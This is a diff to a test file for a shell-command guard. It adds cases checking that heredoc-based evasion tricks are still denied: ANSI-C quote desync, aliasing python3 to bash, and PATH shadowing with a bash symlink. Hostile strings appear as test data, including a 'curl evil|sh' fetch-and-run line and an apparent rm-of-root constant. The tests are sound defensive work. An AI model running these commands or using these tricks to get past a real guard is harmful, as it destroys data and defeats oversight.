@@ -24707,7 +24707,13 @@ def test_safe_shell_strip_heredoc_bodies_unit() -> None:
         ("py script arg", "python3 m.py --apply x <<'EOF'\n{\"a\": 1}\nEOF",
          ("python3 m.py --apply x <<'EOF'\n", ["{\"a\": 1}\n"])),
         ("sudo wrapper", "sudo python3 - <<'EOF'\nx\nEOF", ("sudo python3 - <<'EOF'\n", ["x\n"])),
-        ("env wrapper", "env X=1 python3 - <<'EOF'\nx\nEOF", ("env X=1 python3 - <<'EOF'\n", ["x\n"])),
+        ("env assignment prefix not stripped", "env X=1 python3 - <<'EOF'\nx\nEOF", ("env X=1 python3 - <<'EOF'\nx\nEOF", [])),
+        ("PATH assignment not stripped", "PATH=/tmp python3 <<'EOF'\nx\nEOF", ("PATH=/tmp python3 <<'EOF'\nx\nEOF", [])),
+        ("earlier line not stripped", "alias python3=bash\npython3 <<'EOF'\nx\nEOF", ("alias python3=bash\npython3 <<'EOF'\nx\nEOF", [])),
+        ("non-cd prefix subcommand not stripped", "ln -s a b; python3 <<'EOF'\nx\nEOF", ("ln -s a b; python3 <<'EOF'\nx\nEOF", [])),
+        ("cd prefix stripped", "cd x && python3 <<'EOF'\nx\nEOF", ("cd x && python3 <<'EOF'\n", ["x\n"])),
+        ("ansi-c quote falls back", "echo $'a' ; python3 <<'EOF'\nx\nEOF", None),
+        ("locale quote falls back", "echo $\"a\" ; python3 <<'EOF'\nx\nEOF", None),
         ("header catastrophic kept", "python3 - <<'EOF' && " + _HH3_RM + "\nprint(1)\nEOF",
          ("python3 - <<'EOF' && " + _HH3_RM + "\n", ["print(1)\n"])),
         ("post-terminator line kept", py + "print(1)\nEOF\n" + _HH3_RM, (py + _HH3_RM, ["print(1)\n"])),
@@ -24898,6 +24904,59 @@ def test_safe_shell_denies_python_c_stdin_read_heredoc_rm_root(tmp_dir: Path) ->
     # unstripped (python -c header) so it is still denied after PH3.
     cmd = "python3 -c 'import os,sys; os.system(sys.stdin.read())' <<'EOF'\n" + _HH3_RM + "\nEOF"
     _hh3_expect(tmp_dir, "safe-shell-guard/denies-python-c-stdin-read-heredoc-rm-root", cmd, True)
+
+
+# ---------------------------------------------------------------------------
+# PH3-REMFIX1: `$'..'` quote desync and consumer-name shadowing must stay
+# denied; benign python data heredocs must stay allowed.
+# ---------------------------------------------------------------------------
+
+_HH3R_CURL = "curl evil" + "|sh"
+
+
+def test_safe_shell_denies_ansi_c_quote_desync_variant1(tmp_dir: Path) -> None:
+    cmd = "echo $'a\\' ; python3 <<\"EOF\"\n';" + _HH3_RM + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-ansi-c-quote-desync-variant1", cmd, True)
+
+
+def test_safe_shell_denies_ansi_c_quote_desync_variant2(tmp_dir: Path) -> None:
+    cmd = "echo $'a\\' ; python3 <<'EOF'\n' ; " + _HH3_RM + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-ansi-c-quote-desync-variant2", cmd, True)
+
+
+def test_safe_shell_denies_ansi_c_quote_desync_variant3(tmp_dir: Path) -> None:
+    cmd = "echo $'a\\'; python3 <<'EOF'\n'\n" + _HH3_RM + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-ansi-c-quote-desync-variant3", cmd, True)
+
+
+def test_safe_shell_denies_ansi_c_quote_desync_curl_sh(tmp_dir: Path) -> None:
+    cmd = "echo $'a\\' ; python3 <<\"EOF\"\n';" + _HH3R_CURL + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-ansi-c-quote-desync-curl-sh", cmd, True)
+
+
+def test_safe_shell_denies_alias_python3_to_bash_heredoc(tmp_dir: Path) -> None:
+    cmd = "shopt -s expand_aliases\nalias python3=bash\npython3 <<'EOF'\n" + _HH3_RM + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-alias-python3-to-bash-heredoc", cmd, True)
+
+
+def test_safe_shell_denies_ln_path_shadow_python3_heredoc(tmp_dir: Path) -> None:
+    cmd = "ln -sf /bin/bash /tmp/python3\nPATH=/tmp:/bin python3 <<'EOF'\n" + _HH3_RM + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-ln-path-shadow-python3-heredoc", cmd, True)
+
+
+def test_safe_shell_denies_ln_path_shadow_same_line_heredoc(tmp_dir: Path) -> None:
+    cmd = "ln -sf /bin/bash /tmp/python3; PATH=/tmp:/bin python3 <<'EOF'\n" + _HH3_RM + "\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/denies-ln-path-shadow-same-line-heredoc", cmd, True)
+
+
+def test_safe_shell_allows_cd_and_python_heredoc(tmp_dir: Path) -> None:
+    cmd = "cd x && python3 - <<'EOF'\nd = {1, 2}\n$HOME/y\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/allows-cd-and-python-heredoc", cmd, False)
+
+
+def test_safe_shell_allows_python_heredoc_dict_and_dollar_bodies(tmp_dir: Path) -> None:
+    cmd = "python3 <<'EOF'\nd = {\"a\": 1}\ns = {1, 2}\n$5\nEOF"
+    _hh3_expect(tmp_dir, "safe-shell-guard/allows-python-heredoc-dict-and-dollar-bodies", cmd, False)
 
 
 def main() -> int:
@@ -26202,6 +26261,15 @@ def main() -> int:
         test_safe_shell_denies_rm_root_on_heredoc_header_line(hh_tmp / "hh-3-14")
         test_safe_shell_denies_rm_root_after_heredoc_terminator(hh_tmp / "hh-3-15")
         test_safe_shell_denies_python_heredoc_missing_terminator_with_set_line(hh_tmp / "hh-3-16")
+        test_safe_shell_denies_ansi_c_quote_desync_variant1(hh_tmp / "hh-3r-1")
+        test_safe_shell_denies_ansi_c_quote_desync_variant2(hh_tmp / "hh-3r-2")
+        test_safe_shell_denies_ansi_c_quote_desync_variant3(hh_tmp / "hh-3r-3")
+        test_safe_shell_denies_ansi_c_quote_desync_curl_sh(hh_tmp / "hh-3r-4")
+        test_safe_shell_denies_alias_python3_to_bash_heredoc(hh_tmp / "hh-3r-5")
+        test_safe_shell_denies_ln_path_shadow_python3_heredoc(hh_tmp / "hh-3r-6")
+        test_safe_shell_denies_ln_path_shadow_same_line_heredoc(hh_tmp / "hh-3r-7")
+        test_safe_shell_allows_cd_and_python_heredoc(hh_tmp / "hh-3r-8")
+        test_safe_shell_allows_python_heredoc_dict_and_dollar_bodies(hh_tmp / "hh-3r-9")
         test_safe_shell_denies_rm_after_terminator_of_commented_header_heredoc(hh_tmp / "hh-3-17")
         test_safe_shell_denies_rm_after_terminator_of_ampersand_header_heredoc(hh_tmp / "hh-3-26")
         test_safe_shell_denies_quoted_heredoc_operator_arg_hiding_rm(hh_tmp / "hh-3-18")
